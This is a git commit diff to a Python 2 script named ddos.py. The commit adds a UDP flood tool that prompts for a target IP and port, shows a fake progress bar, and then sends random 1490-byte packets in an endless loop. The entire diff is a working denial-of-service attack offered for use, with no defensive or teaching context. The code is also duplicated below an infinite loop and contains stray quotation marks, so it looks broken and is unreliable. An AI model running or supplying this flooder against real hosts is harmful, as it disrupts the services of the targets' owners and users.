9b37181802b0263a829dcad5333659be0403f90b
Dawn Dream/xm2020 <64729945+Dawn-Dream@users.noreply.github.com>
2020-11-04 09:12:41 +0800

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -45,3 +45,50 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      print "已攻击 %s packet 到 %s throught port:%s"%(sent,ip,port)"
+ 
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
+print "Original author   : HA-MRX"
+print "New author      : DawnDream"
+print "Optimize content : Sweep port attack changed to single port attack"
+print
+ip = raw_input("IP  : ")
+port = input("port  : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(1)
+print "[=====               ] 25%"
+time.sleep(1)
+print "[==========          ] 50%"
+time.sleep(1)
+print "[===============     ] 75%"
+time.sleep(1)
+print "[====================] 100%"
+time.sleep(1)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     print "send %s packet to %s throught port:%s"%(sent,ip,port)"
